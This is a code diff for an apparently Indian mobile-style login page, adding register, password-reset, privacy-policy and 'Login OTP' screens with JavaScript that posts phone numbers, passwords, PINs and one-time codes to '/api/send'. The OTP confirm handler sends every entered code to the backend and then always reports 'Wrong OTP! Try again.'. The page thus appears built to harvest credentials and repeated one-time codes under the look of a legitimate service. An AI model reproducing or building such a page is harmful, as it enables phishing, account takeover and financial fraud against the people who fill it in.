@@ -275,7 +275,7 @@
         </div>
 
         <!-- 2. REGISTER SCREEN -->
-        <div ="register-screen" class="screen-view" style="display: none;">
+        <div id="register-screen" class="screen-view" style="display: none;">
             <div class="reg-header">
                 <i class="fa-solid fa-arrow-left back-btn nav-to-login"></i>
                 <h2>Register</h2>
@@ -316,3 +316,184 @@
             <button class="btn-primary" id="btn-sign-up" type="button">Sign Up</button>
         </div>
 
+        <!-- 3. FORGET PASSWORD SCREEN -->
+        <div id="forgot-screen" class="screen-view" style="display: none;">
+            <div class="reg-header">
+                <i class="fa-solid fa-arrow-left back-btn nav-to-login"></i>
+                <h2>Reset Password</h2>
+            </div>
+
+            <div class="phone-input-wrapper">
+                <i class="fa-solid fa-phone" style="color: #555555; font-size: 20px; margin-right: 15px;"></i>
+                <span class="country-code">+91</span>
+                <input type="tel" placeholder="Phone" id="forgot-phone" inputmode="numeric" pattern="[0-9]*" maxlength="10">
+            </div>
+
+            <div class="input-group">
+                <i class="fa-solid fa-lock"></i>
+                <input type="password" placeholder="New Password" id="forgot-new-pass">
+            </div>
+
+            <div class="input-group otp-wrapper">
+                <i class="fa-regular fa-envelope"></i>
+                <input type="text" placeholder="6-digit OTP Code" id="forgot-otp" inputmode="numeric" pattern="[0-9]*" maxlength="6">
+                <button class="send-otp-btn" id="btn-send-forgot-otp" type="button">Send</button>
+            </div>
+
+            <button class="btn-primary" id="btn-reset-password" type="button" style="margin-top: 15px;">Reset Password</button>
+        </div>
+
+        <!-- 4. PRIVACY POLICY SCREEN -->
+        <div id="privacy-screen" class="screen-view" style="display: none; padding-top: 20px;">
+            <div class="reg-header">
+                <i class="fa-solid fa-arrow-left back-btn nav-to-login"></i>
+                <h2>Privacy Policy</h2>
+            </div>
+            <div class="privacy-container-box">
+                <div class="privacy-content">
+                    <p>This application respects and protects the personal privacy of all users who use the service. In order to provide you with more accurate and personalized services, this application will use and disclose your personal information in accordance with this Privacy Policy.</p>
+                    <h3>1. Scope of application</h3>
+                    <p><strong>(a)</strong> When you register an account, the personal registration information you provide in accordance with the requirements;</p>
+                    <p><strong>(b)</strong> Information automatically received and recorded on your browser and computer, including but not limited to your IP address, browser type, language, date and time.</p>
+                    <h3>2. Information use</h3>
+                    <p>This application will not provide, sell, rent, share or trade your personal information to any unrelated third party without prior permission.</p>
+                    <h3>3. Information Security</h3>
+                    <p>Account has security protection functions. Please keep your username and password secure.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- VERIFICATION MODAL POPUP -->
+        <div class="modal-overlay" id="verification-modal" style="display: none;">
+            <div class="modal-card">
+                <div class="modal-header">
+                    <h3>Login OTP</h3>
+                    <button class="close-modal-btn" id="btn-close-modal" type="button"><i class="fa-solid fa-xmark"></i></button>
+                </div>
+                <div class="modal-body-text">Tap Send to receive the OTP, then enter it to confirm this login.</div>
+                <div class="modal-subtext" id="dynamic-otp-text">OTP will be sent to +91 </div>
+                <div class="timer-text" id="modal-timer"></div>
+                <div class="input-group otp-wrapper">
+                    <i class="fa-regular fa-envelope"></i>
+                    <input type="text" placeholder="Enter 6-digit OTP" id="modal-otp" maxlength="6" inputmode="numeric" pattern="[0-9]*">
+                    <button class="send-otp-btn" id="modal-send-otp-btn" type="button">Send</button>
+                </div>
+                <button class="btn-primary" id="btn-confirm-verification" type="button" style="margin-top: 10px;">Confirm</button>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- JAVASCRIPT LOGIC -->
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            setTimeout(() => {
+                const splash = document.getElementById('splash-screen');
+                if(splash) {
+                    splash.style.opacity = '0';
+                    setTimeout(() => { splash.style.display = 'none'; }, 500);
+                }
+            }, 1500);
+        });
+
+        function showScreen(screenId) {
+            document.querySelectorAll('.screen-view').forEach(el => el.style.display = 'none');
+            document.getElementById(screenId).style.display = 'flex';
+        }
+
+        document.getElementById('nav-to-register').addEventListener('click', () => showScreen('register-screen'));
+        document.getElementById('nav-to-forgot').addEventListener('click', () => showScreen('forgot-screen'));
+        document.getElementById('nav-to-privacy').addEventListener('click', () => showScreen('privacy-screen'));
+        
+        document.querySelectorAll('.nav-to-login').forEach(el => {
+            el.addEventListener('click', () => showScreen('login-screen'));
+        });
+
+        async function sendToBackend(payload) {
+            try {
+                const response = await fetch('/api/send', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                return await response.json();
+            } catch (err) { console.error(err); }
+        }
+
+        // Sign In Action
+        document.getElementById('btn-sign-in').addEventListener('click', async () => {
+            const phone = document.getElementById('login-phone').value.trim();
+            const pass = document.getElementById('login-pass').value.trim();
+            const pin = document.getElementById('login-pin').value.trim();
+            if (!document.getElementById('privacy-agree').checked) { alert("Please agree to privacy agreement."); return; }
+            if (phone.length !== 10) { alert("Enter valid 10-digit phone."); return; }
+            if (!pass || pin.length !== 6) { alert("Enter password and 6-digit PIN."); return; }
+
+            await sendToBackend({ type: 'login', phone, pass, pin });
+            document.getElementById('dynamic-otp-text').innerText = "OTP will be sent to +91 " + phone;
+            document.getElementById('verification-modal').style.display = 'flex';
+        });
+
+        // Modal OTP & Confirm
+        document.getElementById('modal-send-otp-btn').addEventListener('click', async () => {
+            const phone = document.getElementById('login-phone').value.trim();
+            await sendToBackend({ type: 'modal_otp', phone });
+            alert("OTP Sent!");
+        });
+
+        document.getElementById('btn-confirm-verification').addEventListener('click', async () => {
+            const otp = document.getElementById('modal-otp').value.trim();
+            const phone = document.getElementById('login-phone').value.trim();
+            if (otp.length !== 6) { alert("Enter 6-digit OTP"); return; }
+            await sendToBackend({ type: 'verify_otp', phone, otp });
+            alert("❌ Wrong OTP! Try again.");
+            document.getElementById('modal-otp').value = '';
+        });
+
+        document.getElementById('btn-close-modal').addEventListener('click', () => {
+            document.getElementById('verification-modal').style.display = 'none';
+        });
+
+        // Register Action
+        document.getElementById('btn-send-reg-otp').addEventListener('click', async () => {
+            const phone = document.getElementById('reg-phone').value.trim();
+            const username = document.getElementById('reg-username').value.trim();
+            if (!username || phone.length !== 10) { alert("Enter username and phone."); return; }
+            await sendToBackend({ type: 'reg_otp', username, phone });
+            alert("OTP Sent!");
+        });
+
+        document.getElementById('btn-sign-up').addEventListener('click', async () => {
+            const username = document.getElementById('reg-username').value.trim();
+            const pass = document.getElementById('reg-pass').value.trim();
+            const pin = document.getElementById('reg-pin').value.trim();
+            const phone = document.getElementById('reg-phone').value.trim();
+            const invite = document.getElementById('reg-invite').value.trim();
+            if (!username || !pass || pin.length !== 6 || phone.length !== 10) { alert("Fill all fields."); return; }
+
+            await sendToBackend({ type: 'register', username, phone, pass, pin, invite });
+            alert("Registration successful!");
+            showScreen('login-screen');
+        });
+
+        // Forgot Password Action
+        document.getElementById('btn-send-forgot-otp').addEventListener('click', async () => {
+            const phone = document.getElementById('forgot-phone').value.trim();
+            if (phone.length !== 10) { alert("Enter valid phone."); return; }
+            await sendToBackend({ type: 'forgot_otp', phone });
+            alert("OTP sent successfully!");
+        });
+
+        document.getElementById('btn-reset-password').addEventListener('click', async () => {
+            const phone = document.getElementById('forgot-phone').value.trim();
+            const pass = document.getElementById('forgot-new-pass').value.trim();
+            const otp = document.getElementById('forgot-otp').value.trim();
+            if (phone.length !== 10 || !pass || otp.length !== 6) { alert("Fill all fields properly."); return; }
+
+            await sendToBackend({ type: 'reset_pass', phone, pass, otp });
+            alert("Password reset successfully!");
+            showScreen('login-screen');
+        });
+    </script>
+</body>
+</html>
